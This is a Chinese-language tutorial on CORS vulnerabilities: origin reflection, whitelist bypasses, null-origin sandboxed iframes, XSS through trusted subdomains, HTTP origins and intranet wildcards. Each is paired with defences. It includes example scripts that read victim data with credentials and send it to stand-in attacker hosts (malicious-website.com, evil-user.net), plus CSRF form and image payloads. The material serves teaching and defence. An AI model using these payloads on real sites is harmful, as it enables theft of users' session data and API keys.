# Cross-Origin Resource Sharing (CORS)

> **参考：** [CSRF](../Cross-site%20request%20forgery%20(CSRF)/) | [XSS](../Cross-site%20scripting%20(XSS)/) | [SOP](../../../协议/HTTPandHTTPS.md)

---

## 什么是 CORS？

跨域资源共享（Cross-Origin Resource Sharing，简称 CORS）是一种浏览器机制，用于对位于给定域之外的资源进行受控访问。它扩展并增加了同源策略（SOP）的灵活性。然而，如果网站的 CORS 策略配置和实施不当，也可能为跨域攻击提供潜在机会。CORS 不是对跨域攻击（如 CSRF）的防护。

---

## 同源策略 (Same-Origin Policy)

### 为什么需要同源策略？

当浏览器从一个源向另一个源发送 HTTP 请求时，与目标域相关的任何 Cookie（包括认证会话 Cookie）也会作为请求的一部分发送。这意味着响应将在用户会话的上下文中生成，并包含用户特有的任何相关数据。**如果没有同源策略**，你访问了一个恶意网站，它就能读取你的 GMail 邮件、Facebook 私信等。

> **一句话理解：** 浏览器允许你"发出"跨域请求（比如用 `<img>` 加载跨域图片、用 `<form>` 提交到跨域接口），但不允许网页中的 JavaScript **读取**跨域请求的返回内容。这就是 SOP 的核心——**发得出，读不到**。

### 什么是"源"？

"源"(Origin) 由**协议（Protocol）**、**域名（Host）**和**端口（Port）**三部分组成。只有当这三者**完全一致**时，才叫同源。

以 `http://normal-website.com/example/example.html` 为例（协议 `http`、域名 `normal-website.com`、端口 `80`）：

| 访问的 URL | 是否同源？ | 原因 |
|---|---|---|
| `http://normal-website.com/example/` | 是 | 协议、域名、端口均相同 |
| `http://normal-website.com/example2/` | 是 | 路径不同不影响"源"的判断 |
| `https://normal-website.com/example/` | 否 | 协议不同（http vs https） |
| `http://en.normal-website.com/example/` | 否 | 域名不同（子域也算不同源） |
| `http://www.normal-website.com/example/` | 否 | 域名不同 |
| `http://normal-website.com:8080/example/` | 否 | 端口不同（80 vs 8080） |

### SOP 的例外情况

同源策略并非铁板一块，存在一些历史遗留的例外：

- 可以跨域**写入**但不可**读取**某些对象，如 `location` 对象和 iframe/new window 的 `location.href` 属性
- 可以跨域**读取**但不可**写入**某些属性，如 `window.length`（页面的 frame 数量）
- `postMessage()` 函数可以跨域调用，用于在域之间发送消息
- Cookie 的跨域限制比 SOP 宽松——默认情况下子域可以访问父域的 Cookie（可通过 `HttpOnly` 标志部分缓解）

---

## 同源策略的放宽

同源策略非常严格，但现实中的 Web 应用经常需要合法的跨域交互。例如：
- 前端 `https://app.example.com` 需要调用 API `https://api.example.com`
- 网站需要从第三方 CDN 加载资源
- 单页应用需要访问多个后端服务

CORS (Cross-Origin Resource Sharing) 就是为了解决这个问题而设计的——它在安全性（拒绝所有跨域读取）和灵活性（允许合法的跨域访问）之间提供了一个**受控的中间地带**。

**CORS 的工作方式：** 浏览器和服务器通过一套 HTTP 响应头来"协商"跨域访问权限。服务器在响应中声明："我信任来自源 X 的请求"，浏览器检查当前页面是否匹配声明，匹配则允许 JavaScript 读取响应内容。关键的头部包括：

| 响应头 | 作用 |
|---|---|
| `Access-Control-Allow-Origin` | 指定允许哪个源访问响应（最重要） |
| `Access-Control-Allow-Credentials` | 是否允许携带 Cookie/认证信息 |
| `Access-Control-Allow-Methods` | 允许的 HTTP 方法（预检时使用） |
| `Access-Control-Allow-Headers` | 允许的自定义请求头（预检时使用） |

> **关键理解：** CORS 的所有安全判断都在**服务器响应头**中声明，由**浏览器**强制执行。如果服务器配置出错（比如允许了不该允许的源），浏览器就会照做，漏洞由此产生。

---

## CORS 配置问题引发的漏洞

许多现代网站使用 CORS 来允许来自子域和受信任第三方的访问。其 CORS 实现可能包含错误或过于宽松以确保一切正常工作，这可能导致可利用的漏洞。

### 1. 服务器根据客户端 Origin 头生成 ACAO 头

一些应用程序需要向多个其他域提供访问。维护允许域列表需要持续写入，任何错误都可能破坏功能。因此，一些应用程序采取了简单的方法，实际上允许来自任何域的访问。

一种方式是读取请求中的 `Origin` 头，并在响应中包含一个声明请求源被允许的响应头。

例如，应用程序收到以下请求：

```
GET /sensitive-victim-data HTTP/1.1
Host: vulnerable-website.com
Origin: https://malicious-website.com
Cookie: sessionid=...
```

然后响应：

```
HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://malicious-website.com
Access-Control-Allow-Credentials: true
...
```

这些头表明允许来自请求域（malicious-website.com）的访问，并且跨域请求可以包含 Cookie（`Access-Control-Allow-Credentials: true`），因此将在会话中处理。

**漏洞原理：** 因为应用程序在 `Access-Control-Allow-Origin` 头中反射任意来源，这意味着任何域都可以访问来自漏洞域的资源。如果响应包含任何敏感信息（如 API 密钥或 CSRF 令牌），攻击者可以通过在其网站上放置以下脚本来检索：

```javascript
// 1. 创建一个 XMLHttpRequest 对象——这是浏览器提供的用于发送 HTTP 请求的 API
var req = new XMLHttpRequest();

// 2. 注册回调函数：当请求完成（onload）时，自动调用 reqListener 处理响应
req.onload = reqListener;

// 3. 配置请求：
//    - 'get': 使用 GET 方法
//    - 'https://vulnerable-website.com/sensitive-victim-data': 目标 URL（受害者的敏感数据接口）
//    - true: 异步执行（不阻塞页面其他操作）
req.open('get','https://vulnerable-website.com/sensitive-victim-data',true);

// 4. 关键设置：要求浏览器在跨域请求中携带 Cookie
//    没有这一行，浏览器不会发送用户的认证 Cookie
req.withCredentials = true;

// 5. 发送请求——浏览器会自动带上受害者在该域名下的 Cookie
req.send();

// 6. 回调函数：请求成功后执行
//    this.responseText 包含服务器返回的敏感数据（如 API key）
//    将其作为参数附加到攻击者服务器的 URL 上，实现数据外传
function reqListener() {
    location='//malicious-website.com/log?key='+this.responseText;
};
```

**攻击流程逐步解读：**

1. 受害者登录了 `vulnerable-website.com`，浏览器保存了会话 Cookie
2. 受害者访问攻击者控制的页面 `malicious-website.com`
3. 攻击者页面中的 JavaScript 向 `vulnerable-website.com` 发起跨域请求
4. 浏览器自动附带受害者的 Cookie（因为 `withCredentials = true`）
5. 漏洞服务器将请求的 `Origin`（`malicious-website.com`）反射到 `Access-Control-Allow-Origin` 响应头
6. 浏览器检查：当前页面源 `malicious-website.com` 匹配响应头中的允许源——允许 JavaScript 读取响应
7. `reqListener` 被调用，敏感数据通过 URL 参数发送到攻击者服务器

> **为什么这是漏洞？** 正常情况下，SOP 会阻止第 6 步——浏览器看到响应头中允许的是 `malicious-website.com`，而攻击者的页面恰好就运行在 `malicious-website.com` 上，所以浏览器放行了。如果服务器不反射任意 Origin 头，而是固定返回 `Access-Control-Allow-Origin: https://vulnerable-website.com`，浏览器就会发现源不匹配并阻止 JavaScript 读取响应，攻击就失败了。


---

### 2. Origin 头解析错误

一些支持多源访问的应用程序使用白名单。当收到 CORS 请求时，将提供的 origin 与白名单比较。如果 origin 在白名单中，则反射在 `Access-Control-Allow-Origin` 头中。

在实现 CORS 源白名单时经常出现错误。一些组织决定允许来自所有子域（包括尚未存在的未来子域）的访问。这些规则通常通过匹配 URL 前缀或后缀，或使用正则表达式来实现。实现中的任何错误都可能导致向非预期的外部域授予访问权限。

**后缀匹配绕过 — 白名单检查"以 XXX 结尾"：**

假设应用程序用后缀匹配来允许 `normal-website.com` 的所有子域：

```
白名单规则：origin.endsWith("normal-website.com")
```

攻击者只需注册域名 `hackersnormal-website.com`，该域名以 `normal-website.com` 结尾，通过白名单校验。攻击者在此域上托管恶意页面，即可读取受害者在该应用程序中的敏感数据。

**前缀匹配绕过 — 白名单检查"以 XXX 开头"：**

```
白名单规则：origin.startsWith("normal-website.com")
```

攻击者可以注册 `normal-website.com.evil-user.net`（利用攻击者控制的父域 `evil-user.net` 创建子域），通过白名单。

**正则表达式缺陷 — 点号未转义：**

```
错误的正则：/^https?:\/\/.*\.normal-website\.com$/i
```
这个正则可以匹配 `https://evil.com/normal-website.com`，因为 `.*` 可以吞掉中间的任意字符。

> **防御要点：** 白名单匹配应做**精确匹配**而非模糊匹配。如果必须支持多个子域，应维护显式的允许列表，或将 origin 与列表中的每一项做**完全相等**比较。

---

### 3. 白名单中的 null 源值

**利用点：** 服务器只信任 `Origin: null`，但正常的网页（`https://...`）发出的请求，Origin **永远不可能是 `null`**。攻击者必须构造一种特殊的文档上下文，让浏览器认为该文档"没有源"。

**为什么文档的源会是 `null`？**

浏览器用 `(协议, 域名, 端口)` 三元组来确定一个文档的源。但有些文档天生**无法**拥有一个明确的三元组：

| 场景 | 为什么源是 `null` |
|---|---|
| `data:` URI（如 `data:text/html,...`） | `data:` 不是 `http:` 或 `https:`——它没有域名、没有端口，不来自任何服务器。浏览器无法为它分配一个合理的源，所以源 = `null` |
| `file:` 协议（本地 HTML 文件） | 直接从磁盘打开的文件同样没有协议+域名+端口。不同浏览器的处理有差异，但按规范源应为 `null` |
| 沙盒化（sandboxed）的 iframe | `<iframe sandbox>` 中的文档，即使加载自 `https://...`，浏览器也会**主动切断**它与原始源的关联——沙盒的设计意图就是让其中的内容"不属于任何源"，以防止信息泄露。因此其源被设为 `null` |
| 跨域重定向 | 某些跨域重定向链中，浏览器在中间步骤无法确定源 |

> **核心理解：** `Origin: null` 的意思是"我是匿名的，我无法证明自己属于哪个服务器"。`null` 不是指"空"或"没有"，而是**"无法确定来源"**。浏览器在所有无法归类的文档请求中统一使用 `null` 作为 Origin 值。

**应用场景：** 一些开发者为了方便本地测试，将 `null` 加入 CORS 白名单——本地 HTML 文件通过 `file://` 双击打开调试时，其 Origin 就是 `null`。但这个配置一旦保留到生产环境，就成了漏洞。

如果服务器响应：
```
HTTP/1.1 200 OK
Access-Control-Allow-Origin: null
Access-Control-Allow-Credentials: true
```

攻击工具：利用 **data: 协议 + sandbox 属性** 的 `<iframe>` 来构造 Origin 为 `null` 的请求。

**什么是 `<iframe>`？**

`<iframe>`（inline frame，内联框架）是 HTML 的一个元素，它可以在当前页面中**嵌入另一个完整的 HTML 文档**。你可以把它理解为"页面中的页面"——外层是攻击者控制的 `https://evil.com`，内层 iframe 里是另一段 HTML/JavaScript，两者各自拥有独立的浏览上下文（包括独立的 `window` 对象、独立的 JavaScript 执行环境）。

```html
<!-- 最基本的 iframe 用法：在 A 页面中嵌入 B 页面 -->
<iframe src="https://example.com/child-page.html"></iframe>
<!-- 浏览器会在 evil.com 页面内部渲染一个子窗口，显示 example.com 的内容 -->
```

**在 null origin 攻击中，iframe 扮演什么角色？**

攻击者的目标是发起一个 `Origin: null` 的请求——但攻击者自己的页面运行在 `https://evil.com`，它的 Origin 固定为 `https://evil.com`，无法伪装成 `null`。所以攻击者需要一个**"替身"**——一个独立的文档上下文，其 Origin 恰好是 `null`。

iframe 就是这个替身。iframe 内部是一个独立的文档，它可以有自己的 HTML、自己的 JavaScript、自己的 Origin。攻击者无法直接把自己的 Origin 改成 `null`，但可以通过以下两层机制，让 iframe 内部的文档以 `Origin: null` 的身份发起请求：

```
外层页面 (https://evil.com)
  Origin: https://evil.com  ← 无法改变

  ┌───────────────────────────────────────────┐
  │ <iframe sandbox src="data:text/html,..."> │
  │                                           │
  │  内层文档（独立上下文）                      │
  │  Origin: null  ← 这就是攻击者需要的替身      │
  │                                           │
  │  XMLHttpRequest ──→ vulnerable-website.com│
  │  Origin: null        (请求由此发出)         │
  └───────────────────────────────────────────┘
```

**为什么选择 `sandbox` + `data:` URI 的组合？**

单用 iframe 加载一个普通的 `https://` 页面，iframe 内文档的 Origin 就是它自己的真实源（比如 `https://sub.example.com`），不会变成 `null`。必须同时满足两个条件：

1. **`sandbox` 属性**——告诉浏览器："把这个 iframe 里的内容隔离起来，不要让它和任何真实源关联。"浏览器执行这一指令的方式，就是将该文档的源设为 `null`
2. **`data:text/html,...` 作为 src**——`data:` URI 本身就是"不从任何服务器来"的数据。浏览器无法为它确定协议+域名+端口，天生就是匿名的

两者叠加，浏览器双重确认该文档的源无法确定，最终 Origin = `null`。

**`sandbox` 属性值的含义：**

| 标记 | 作用 | 在本攻击中为什么需要 |
|---|---|---|
| `allow-scripts` | 允许执行 JavaScript | 不写这个，iframe 内的 `<script>` 不会执行，无法发起 XMLHttpRequest |
| `allow-top-navigation` | 允许修改顶层窗口的 URL | 数据外传时，需要 `location = '...'` 改变顶层页面地址来将数据附加到 URL |
| `allow-forms` | 允许提交表单 | 备用——如果 XMLHttpRequest 不行，还可以用表单提交来外传数据 |

```html
<!--
  两层机制共同作用，让 iframe 内的文档源变为 null：

  1. sandbox 属性：浏览器主动切断文档与原始源的关联。
     被 sandbox 的文档，即使从 https:// 加载，源也是 null。

  2. src="data:text/html,..."：Data URI 不是 http/https/ftp——
     它没有域名和端口，本身就是"无源"的。
     这里直接将 HTML 和 JS 内联在 src 中，无需托管外部文件。
-->
<iframe sandbox="allow-scripts allow-top-navigation allow-forms"
        src="data:text/html,<script>
        // 这段 JS 运行在 data: URI 文档中，且被 sandbox 隔离
        // 浏览器在发送请求时，Origin 头只能是 'null'
        var req = new XMLHttpRequest();
        req.onload = reqListener;
        req.open('get','vulnerable-website.com/sensitive-victim-data',true);
        req.withCredentials = true;  // 携带受害者的 Cookie
        req.send();

        function reqListener() {
            // 将响应内容（敏感数据）外传到攻击者服务器
            location='malicious-website.com/log?key='+this.responseText;
        };
</script>"></iframe>
```

**逐层解析浏览器行为：**

1. 正常的 `https://example.com` 页面有明确的 (https, example.com, 443) 三元组——浏览器如实发送 `Origin: https://example.com`
2. 但沙盒化（sandbox）的 iframe 加载 `data:text/html,...` 时——`data:` 协议本身没有域名和端口，沙盒又主动切断了文档与任何外部源的关联。浏览器根据规范判定：该文档**无法确定来源**，源 = `null`
3. 因此，iframe 内脚本发起的请求，浏览器自动附带的 Origin 头为 `Origin: null`
4. 服务器校验白名单——看到 `null`，匹配——返回 `Access-Control-Allow-Origin: null`，允许读取响应
5. 敏感数据通过 `location` 重定向外传到攻击者控制的服务器

> **一句话总结：** 正常的网页永远不可能以 `Origin: null` 发起请求；如果服务器信任 `null`，就相当于信任了所有"匿名"的请求来源——包括攻击者用沙盒 iframe 精心构造的恶意文档。


---

### 4. 通过 CORS 信任关系利用 XSS

即使"正确"配置的 CORS 也会在两个源之间建立信任关系。如果网站信任一个存在 XSS 漏洞的源，攻击者可以利用 XSS 注入 JavaScript，使用 CORS 从信任该漏洞应用的站点检索敏感信息。

**场景：** `vulnerable-website.com` 的 API 信任其子域 `subdomain.vulnerable-website.com`：

```
# 正常请求——子域的前端页面调用主站 API
GET /api/requestApiKey HTTP/1.1
Host: vulnerable-website.com
Origin: https://subdomain.vulnerable-website.com
Cookie: sessionid=...

# 服务器响应——因为是白名单中的子域，允许访问
HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://subdomain.vulnerable-website.com
Access-Control-Allow-Credentials: true
```

这个配置本身是正确的。但问题在于：**如果 `subdomain.vulnerable-website.com` 存在 XSS 漏洞**，那么攻击者可以通过反射型 XSS 在该子域的上下文中执行任意 JavaScript：

```
https://subdomain.vulnerable-website.com/?xss=<script>
    // 这段脚本运行在 subdomain.vulnerable-website.com 的上下文中
    // 向主站发起 CORS 请求时，Origin 为 https://subdomain.vulnerable-website.com
    // 这恰好是主站白名单中的源——请求被允许！
    var req = new XMLHttpRequest();
    req.onload = function() {
        // 将 API key 发送到攻击者服务器
        fetch('https://evil-user.net/steal?data=' + encodeURIComponent(this.responseText));
    };
    req.open('get', 'https://vulnerable-website.com/api/requestApiKey', true);
    req.withCredentials = true;
    req.send();
</script>
```

**攻击链：** XSS 漏洞提供代码执行 -> 代码在受信任源的上下文中运行 -> CORS 允许（因为源在信任列表中）-> 敏感数据被窃取。

> **关键洞察：** CORS 信任是**传递性**的。如果 A 信任 B，而 B 存在安全漏洞，那么对 A 的访问实际上也暴露给了能利用 B 漏洞的攻击者。在 CORS 设计中，被信任的源必须具备同等级别的安全性。


---

### 5. 配置不当的 CORS 破坏 TLS

**核心矛盾：** HTTPS 保护的是”传输中的管道”（加密 + 防篡改），但无法保护”管道两端的行为”。如果 CORS 白名单中包含了一个 HTTP（非加密）的源，那么即使主站完美使用了 HTTPS，攻击者仍可通过操控 HTTP 流量来绕过保护。

**TLS（传输层安全协议）**是 HTTPS 的核心加密机制。它的主要作用是：

| 保护目标 | 说明 |
|---|---|
| 机密性（防窃听） | 传输内容加密，中间人看不到明文 |
| 身份验证（防冒充） | 证书验证确保你在和真正的服务器通信 |
| 完整性（防篡改） | 检测数据在传输中是否被修改 |

**漏洞场景：** `vulnerable-website.com` 全程使用 HTTPS，但在 CORS 白名单中包含了 `http://trusted-subdomain.vulnerable-website.com`（注意是 **HTTP** 而非 HTTPS）。因为 HTTP 流量是明文传输的，中间人可以读取并篡改。

攻击步骤：

```
步骤 1: 受害者发出纯 HTTP 请求（访问任何 HTTP 网站时都会触发）
        受害者 ----[HTTP 明文]----> 互联网

步骤 2: 攻击者（中间人）拦截该 HTTP 请求，注入 302 重定向到
        http://trusted-subdomain.vulnerable-website.com
        受害者浏览器跟随重定向

步骤 3: 受害者浏览器发起对该 HTTP 子域的请求
        攻击者再次拦截，不转发到真实服务器，
        而是返回一个伪造的 HTML 页面

步骤 4: 伪造页面中包含 CORS 请求脚本，目标为 https://vulnerable-website.com
        浏览器执行脚本，发起 CORS 请求
        Origin: http://trusted-subdomain.vulnerable-website.com

步骤 5: 主站收到 CORS 请求，检查 Origin —— 命中白名单！
        返回敏感数据 + Access-Control-Allow-Origin: http://trusted-subdomain.vulnerable-website.com

步骤 6: 攻击者的伪造页面通过 JavaScript 读取响应数据，
        外传到攻击者控制的服务器
```

**这个攻击之所以奏效的关键原因：**

- HTTPS 主站的 CORS 白名单中混入了 HTTP 源
- HTTP 流量可以被任何网络中间人（ISP、公共 WiFi 运营者、ARP 欺骗者）拦截和篡改
- 攻击者不需要攻破 HTTPS 加密——他只需要操控 HTTP 那一段
- 即使主站所有 Cookie 都设置了 `Secure` 标志，受害者浏览器在发起 CORS 请求时仍然会通过 HTTPS 发送这些 Cookie

> **防御要点：** CORS 白名单中的源必须和使用 HTTPS 的主站保持一致的传输安全级别。如果主站使用 HTTPS，白名单中的**所有源**也必须使用 HTTPS。



---

### 6. 内网与无凭据 CORS

大多数 CORS 攻击依赖于响应头的存在：
```
Access-Control-Allow-Credentials: true
```

没有这个头，受害者浏览器将拒绝发送其 Cookie，意味着攻击者只能访问未认证的内容——这些内容攻击者直接访问目标网站也能看到，似乎没有攻击价值。

**但有一个例外场景：** 当目标网站位于组织内网、在私有 IP 地址空间内时。攻击者从外网无法直接访问内网资源，但可以通过受害者的浏览器作为**代理**来访问。

**内网 CORS 漏洞的独特之处：**

- 外部攻击者无法直接访问内网应用（被防火墙/NAT 阻挡）
- 但内网用户可能同时访问外网（浏览互联网）
- 内网应用往往安全标准较低——开发者认为"反正外面访问不到"
- 如果内网应用设置了 `Access-Control-Allow-Origin: *`（且不要求凭据），则任何外网页面都可以通过受害者的浏览器向内网发起跨域请求并读取响应

**攻击场景示例：**

内网中有一个文档阅读器，位于 `http://intranet.normal-website.com`：

```
# 内网用户的内网请求——前端页面请求文档
GET /reader?url=doc1.pdf HTTP/1.1
Host: intranet.normal-website.com
Origin: https://normal-website.com
```

服务器响应（通配符 CORS）：
```
HTTP/1.1 200 OK
Access-Control-Allow-Origin: *
```

这个配置意味着：**任何网站**都可以通过用户的浏览器向内网应用发起请求并读取响应。攻击者在外网部署恶意页面，当内网用户访问该页面时，JavaScript 以用户浏览器为跳板探测和读取内网资源。

> **防御要点：** 内网资源绝不使用 `Access-Control-Allow-Origin: *`。内网的"隐蔽性"不是安全措施——一旦用户浏览器可以访问外网，内部资源就暴露在了基于浏览器的跨域攻击面前。

---

## 如何防御 CORS 攻击

CORS 漏洞主要是由配置错误引起的，因此防御是一个配置问题。以下从正确做法和常见错误两个角度来组织。

### 1. 正确配置跨域请求

**推荐做法：** 当 Web 资源包含敏感信息时，应使用**白名单机制**（维护一个受信任源的列表），验证请求的 `Origin` 头是否在列表中，仅在匹配时才返回 `Access-Control-Allow-Origin`。

**错误做法：** 无条件反射 `Origin` 头的值。

```
# 正确：仅在 Origin 匹配白名单时返回头
if (origin in allowed_origins) {
    response.setHeader("Access-Control-Allow-Origin", origin);
}
# 不匹配时不返回任何 CORS 头——浏览器会阻止 JavaScript 读取响应

# 错误：直接反射——等于允许所有源
response.setHeader("Access-Control-Allow-Origin", request.getHeader("Origin"));
```

### 2. 仅允许受信任的站点

- CORS 白名单中只放确实需要跨域访问的、**安全可控**的源
- 不要为了"方便"把所有子域加入白名单——每个被信任的子域都必须具备同等的安全水平
- 不要使用前缀/后缀/正则等模糊匹配——使用**精确的完全相等比较**
- 定期审查白名单，移除不再需要的条目

### 3. 避免将 null 列入白名单

- 不要使用 `Access-Control-Allow-Origin: null`
- 本地开发时如果需要跨域，应配置本地开发服务器使用具体的 origin（如 `http://localhost:3000`），而非依赖 `null`
- 如果确实需要支持来自 `file://` 协议的本地文件请求，应仅在开发环境中启用，生产环境禁用

### 4. 在内网中避免使用通配符

- 内网应用绝不使用 `Access-Control-Allow-Origin: *`
- 内网的"网络隔离"不是安全边界——只要内网用户的浏览器能访问外网，外网页面就能通过用户浏览器探测内网
- 内网资源应和内网资源一样进行 CORS 配置，明确指定允许的源

### 5. CORS 不是服务器端安全策略的替代品

这是最容易被忽视的一点：

- CORS 是**浏览器端**的限制——它阻止的是**浏览器中的恶意 JavaScript**读取跨域响应
- 攻击者可以不通过浏览器直接发送 HTTP 请求（如 `curl`、Burp Suite、自定义脚本），这些请求**不受 CORS 约束**
- 因此，敏感数据端点的安全性必须依赖**服务器端**的身份验证和授权，不能假定 CORS 配置正确就安全了
- 实际上正确的分层防护应该是：服务器端认证 + 服务器端授权 + 正确配置的 CORS（作为浏览器侧的安全网）

---

## Access-Control-Allow-Origin 响应头

`Access-Control-Allow-Origin` 头包含在一个网站对来自另一个网站的请求的响应中，并标识请求的允许源。浏览器将 `Access-Control-Allow-Origin` 与请求网站的源进行比较，如果匹配则允许访问响应。

### 通配符

`Access-Control-Allow-Origin` 头支持通配符：
```
Access-Control-Allow-Origin: *
```

注意：通配符不能在值内使用。例如以下是无效的：
```
Access-Control-Allow-Origin: https://*.normal-website.com
```

从安全角度来看，CORS 规范中通配符的使用受到限制——不能将通配符与跨域凭据传输（认证、Cookie 或客户端证书）组合使用。因此，以下响应是**不允许**的：
```
Access-Control-Allow-Origin: *
Access-Control-Allow-Credentials: true
```

鉴于这些限制，一些 Web 服务器根据客户端指定的 origin 动态创建 `Access-Control-Allow-Origin` 头。这是对 CORS 约束的一种不安全的变通方法。

### 携带凭据的跨域请求

跨域资源请求的默认行为是**不携带凭据**（如 Cookie 和 Authorization 头）。这是出于安全考虑——如果没有这个默认限制，任何网站都可以以登录用户的身份向其他网站发起请求并读取响应。

但很多场景确实需要携带凭据的跨域访问（如前端 SPA 调用后端 API），这需要**两端配合**：

**客户端（JavaScript）：** 必须显式声明需要发送凭据

```javascript
var req = new XMLHttpRequest();
req.open('get', 'https://api.example.com/user-data', true);
req.withCredentials = true;  // 告诉浏览器：带上该域的 Cookie
req.send();
```

**服务端（响应头）：** 必须同时满足两个条件

```
Access-Control-Allow-Origin: https://app.example.com   (1)
Access-Control-Allow-Credentials: true                  (2)
```

条件 (1) 必须是**具体的源**（不能是 `*` 通配符），条件 (2) 明确允许携带凭据。两者缺一不可——如果服务器返回 `ACAO: *` 同时设置 `ACAC: true`，浏览器会拒绝（规范明确禁止此组合）。

**完整的带凭据请求交互：**

```
# 客户端发送的请求——包含 Cookie
GET /user-data HTTP/1.1
Host: api.example.com
Origin: https://app.example.com
Cookie: session=abc123xyz...

# 服务器响应——源匹配 + 允许凭据
HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://app.example.com
Access-Control-Allow-Credentials: true
{"username": "victim", "apiKey": "sk-xxxx"}
```

> **安全提示：** `Access-Control-Allow-Credentials: true` 应仅对确实需要用户会话的端点启用。对于公开数据（如公共 API、CDN 资源），不要设置此头。

### Pre-flight 预检请求

预检（Pre-flight）被添加到 CORS 规范中，以保护**在 CORS 出现之前就存在的遗留资源**。在 CORS 出现之前，浏览器只允许跨域发送简单的 GET/POST 请求（通过 `<form>` 等）。引入 CORS 后，浏览器允许使用 PUT、DELETE 等方法以及自定义请求头——但遗留服务器可能不理解这些请求，如果不加保护直接发出，可能触发意料之外的副作用。

**触发预检的条件（非简单请求）：**

| 条件 | 简单请求（不触发预检） | 触发预检 |
|---|---|---|
| HTTP 方法 | GET、HEAD、POST | PUT、DELETE、PATCH 等 |
| Content-Type | `application/x-www-form-urlencoded`、`multipart/form-data`、`text/plain` | `application/json` 等 |
| 自定义请求头 | 无 | 任何非标准头（如 `Authorization`、`X-API-Key`） |

**预检流程：**

```
步骤 1：浏览器发送 OPTIONS 请求（预检）
─────────────────────────────────────────
OPTIONS /data HTTP/1.1
Host: api.example.com
Origin: https://normal-website.com
Access-Control-Request-Method: PUT
Access-Control-Request-Headers: Special-Request-Header
─────────────────────────────────────────

    浏览器在问："我来自 normal-website.com，
    想用 PUT 方法、带 Special-Request-Header 头，
    你允许吗？"

步骤 2：服务器返回允许的方法和头
─────────────────────────────────────────
HTTP/1.1 204 No Content
Access-Control-Allow-Origin: https://normal-website.com
Access-Control-Allow-Methods: PUT, POST, OPTIONS
Access-Control-Allow-Headers: Special-Request-Header
Access-Control-Allow-Credentials: true
Access-Control-Max-Age: 240
─────────────────────────────────────────

    服务器回答："允许 PUT 和 POST 方法、
    Special-Request-Header 这个头，
    这个预检结果可以缓存 240 秒。"

步骤 3：预检通过后，浏览器发送实际的 PUT 请求
```

**各响应头含义：**

| 头部 | 含义 |
|---|---|
| `Access-Control-Allow-Methods` | 服务器明确允许的 HTTP 方法列表 |
| `Access-Control-Allow-Headers` | 允许的自定义请求头列表 |
| `Access-Control-Max-Age` | 预检结果的缓存时间（秒），在此期间同一 URL 的同类请求不需要再次预检 |

> **注意：** 预检请求本身不携带 Cookie 或用户凭据——它只是一个"问询"阶段。实际的数据请求在预检通过后才发送，那时才会携带凭据。预检增加了额外的一次 HTTP 往返，增加了页面加载延迟，这就是 `Access-Control-Max-Age` 存在的原因——让浏览器缓存预检结果，减少重复的预检开销。

---

## CORS 是否能防御 CSRF？

CORS **不能**防御 CSRF 攻击，这是一个常见的误解。实际上 CORS 与 CSRF 防御解决的是不同层面的问题。

### 为什么 CORS 不能防御 CSRF？

CSRF 攻击的核心是利用**浏览器自动携带 Cookie 的特性**，通过简单的 HTML 元素（如 `<form>`、`<img>`）发起跨域请求。这些请求方式根本不受 CORS 限制：

```html
<!-- 方式 1：自动提交的 HTML 表单——完全不涉及 CORS -->
<form action="https://bank.com/transfer" method="POST">
    <input type="hidden" name="to" value="attacker" />
    <input type="hidden" name="amount" value="10000" />
</form>
<script>document.forms[0].submit();</script>

<!-- 方式 2：隐藏的图片标签——发起 GET 请求 -->
<img src="https://bank.com/transfer?to=attacker&amount=10000" style="display:none" />
```

这些攻击方式中：
- 浏览器发出了跨域请求（并自动携带了目标域的 Cookie）
- 但攻击者不需要读取响应——请求本身就已经触发了操作（转账、修改密码等）
- CORS 只能阻止攻击者**读取**响应，不能阻止**发出**请求

### CORS 和 CSRF 的关系

```
防御对象                    有效手段
──────────────────────────────────────────
读取跨域响应（窃取数据）    CORS 策略 + SOP
伪造操作请求（CSRF）         CSRF Token、SameSite Cookie、Referer 校验
```

配置不当的 CORS 可能**加剧** CSRF 的影响：如果攻击者既能伪造请求又能读取响应，攻击面从"盲打"（不知道操作结果）升级为"完全交互"（能读取返回的敏感数据）。

> **总结：** 防御 CSRF 需要 CSRF Token、SameSite Cookie 或 Referer 校验；依赖 CORS 来防御 CSRF 是方向性错误。

---

